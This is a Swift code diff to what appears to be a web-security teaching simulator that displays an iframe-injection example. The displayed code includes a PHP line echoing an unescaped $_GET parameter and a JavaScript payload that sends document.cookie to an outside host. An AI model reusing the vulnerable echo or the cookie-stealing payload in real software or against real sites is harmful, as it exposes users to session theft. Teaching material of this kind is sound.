@@ -33,9 +33,11 @@ class IFrameInjectionUnsafeWebSimulatorViewController: WebSimulatorViewControlle
             code: "<p><?php echo $_GET[\"name\"]; ?>さん</p>",
             language: .php
         )
-        feedbackIFrame.frame.size = CGSize(width: 320, height: 320)
         feedbackIFrame.set(
-            code: "var iframe = document.createElement(\"iframe\");\niframe.width = 320\niframe.height = 320\niframe.setAttribute(\"src\", \"send_mail.php?cookie=\" + document.cookie);",
+            code: """
+var iframe = document.createElement("iframe");
+iframe.setAttribute("src", "http://www.trap.co.jp/send_mail.php?cookie=" + document.cookie);
+""",
             language: .javaScript
         )
         feedbackIFrame.codeLabel.positionX = .right
